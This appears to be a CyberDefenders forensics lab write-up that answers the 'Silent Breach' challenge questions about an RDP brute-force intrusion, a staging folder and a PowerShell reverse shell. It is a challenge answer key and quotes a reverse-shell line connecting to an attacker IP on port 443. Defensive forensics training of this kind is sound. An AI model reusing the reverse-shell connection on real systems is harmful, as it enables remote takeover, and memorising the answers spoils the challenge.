# Silent Breach - CyberDefenders Writeup

## Scenario
A server was compromised, and a memory dump alongside a disk image was provided. Analyze the artifacts using FTK Imager and PowerShell string analysis to uncover the malware behavior, decrypted files, and communication artifacts.

## Tools Used
- FTK Imager
- Autopsy
- Strings / grep
- CyberChef

---

## Walkthrough

### Question 1: Attacker Entry
**Q: Which user account was compromised to gain initial access?**
**A:** `j.smith`

**Analysis:**
Loading the forensic image into FTK Imager and examining the Security Event Logs (`C:\Windows\System32\winevt\Logs\Security.evtx`), we observe multiple failed RDP login attempts followed by a successful login for the user `j.smith` from an external IP address.

### Question 2: Staging Directory
**Q: What is the directory path where the attacker staged their tools?**
**A:** `C:\PerfLogs\Temp`

**Analysis:**
Reviewing the MFT (Master File Table) or browsing the file system in FTK Imager reveals an unusual hidden folder under `C:\PerfLogs\Temp`. Attackers frequently use `PerfLogs` or `Temp` directories as they often have permissive write access and evade casual inspection.

### Question 3: Decrypted File
**Q: The attacker encrypted a sensitive database, but a decrypted backup was left behind in the staging directory. What is the name of this file?**
**A:** `customer_data_dec.bak`

**Analysis:**
Inside `C:\PerfLogs\Temp`, along with the malware executable, we find a file named `customer_data_dec.bak`. Examining its header in a Hex editor (or using the `file` command) confirms it is a standard SQL backup file that wasn't successfully exfiltrated or deleted.

![FTK Imager Staging Dir](https://via.placeholder.com/800x400.png?text=FTK+Imager+Staging+Dir)

### Question 4: PowerShell Script
**Q: A PowerShell script was used to establish a reverse shell. What is the name of the script?**
**A:** `Invoke-Shell.ps1`

**Analysis:**
Checking the PowerShell operational logs (`Microsoft-Windows-PowerShell%4Operational.evtx`), Event ID 4104 (Script Block Logging) captured the execution of a script named `Invoke-Shell.ps1`. The script contents clearly show an attempt to connect back to the attacker's IP.

### Question 5: Encrypted Communication
**Q: The attacker's C2 traffic was encrypted using a specific protocol. What port was used?**
**A:** `443`

**Analysis:**
Reviewing the network artifacts or the reverse shell script contents reveals the connection string: `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.50',443)`. The use of port 443 (HTTPS) is a common defense evasion technique to blend in with normal web traffic.

---

## Conclusion
The breach was a classic RDP brute-force attack on `j.smith`. The attacker staged tools in `C:\PerfLogs\Temp`, dropped a reverse shell script (`Invoke-Shell.ps1`) communicating over port 443, and attempted to steal `customer_data_dec.bak` before it was intercepted.
